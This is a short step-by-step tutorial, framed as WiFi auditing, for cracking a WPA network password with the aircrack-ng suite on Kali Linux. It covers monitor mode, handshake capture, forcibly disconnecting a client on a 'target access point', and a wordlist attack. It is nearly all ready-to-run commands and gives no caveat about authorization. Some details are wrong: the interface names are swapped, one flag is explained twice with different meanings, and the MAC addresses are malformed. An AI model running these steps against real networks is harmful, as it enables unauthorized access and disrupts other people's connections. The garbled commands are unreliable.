WiFi Auditing on Kali Linux using Aircrack -


Check WiFi Adapter’s Supported Interface Modes -

Open Terminal >

iw list   (locate "Supported interface modes:", look for "* monitor")
exit


Put WiFi Device Into Montior Mode & Scan For Access Points -

Open Terminal >

airmon-ng check 
airmon-ng check kill
airmon-ng start wlan0mon    (<--replace ‘wlan0’ with your WiFi device)

(1st checks for conflicting processes, 2nd kills conflicting processes, 3rd starts monitor mode)

airodump-ng wlan0   (replace 'wlan0' with your wifi device)


Locate the BSSID and CH# of your target access point >

Ctrl + C    (end airodump & go back)


Start Handshake Capture -

airodump-ng --bssid 00:00:00:00:00 -c 00 -w abc wlan0
(-w = YourBSSID#, -c = YourCH#, -w = TempFileName)

Wait For a Client To Connect With The WiFi P/W -or-
Kick A Device To Capture The Re-Connection Handshake)

Locate a MAC Address of a device to Kick >
(MAC address displayed as "STATION")

Open New Terminal >

aireplay-ng -0 1 --ignore-negative-one -a 00:00:00:00:00 -c 11:11:11:11:11 wlan0
(-a = BSSID), -c = MAC)

(Watch first terminal (airodump) for "WPA handshake: 00:00:00:00:00" to be displayed across the top of terminal, 
next to 'fixed channel wlan0') 

Ctrl + C    (end aireplay & go back)


Crack the Captured File (.cap) >

aircrack-ng -w wordlist.txt --bssid 00:00:00:00:00 abc-01.cap
(assuming your terminal is open in the same dir as wordlist & .cap)

(Aircrack will try all passwords in wordlist.txt until it finds the correct one)

Password will be displayed in terminal.


DONE!
